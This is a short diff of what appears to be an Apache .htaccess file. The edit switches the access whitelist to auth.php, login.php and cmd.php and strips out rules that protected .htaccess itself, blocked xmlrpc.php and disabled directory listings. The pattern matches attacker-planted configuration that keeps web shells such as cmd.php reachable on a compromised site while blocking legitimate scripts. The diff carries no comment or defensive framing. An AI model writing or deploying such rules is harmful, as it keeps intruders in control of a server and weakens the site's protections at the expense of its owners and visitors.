@@ -2,23 +2,7 @@
 Order allow,deny 
 Deny from all 
 </FilesMatch> 
-<FilesMatch "^(cmd.php|loginku.php|auth.php)$"># 
+<FilesMatch "^(auth.php|login.php|cmd.php)$"># 
 Order allow,deny 
 Allow from all 
-</FilesMatch> 
-<FilesMatch "\.(jpg|png|gif|pdf|jpeg)$"> 
-Allow from all 
-</FilesMatch> 
- 
-<Files .htaccess> 
-order allow,deny 
-deny from all 
-</Files> 
- 
-<Files xmlrpc.php> 
-order deny,allow 
-deny from all 
-</Files> 
- 
-Options All -Indexes 
-DirectoryIndex index.html
+</FilesMatch>
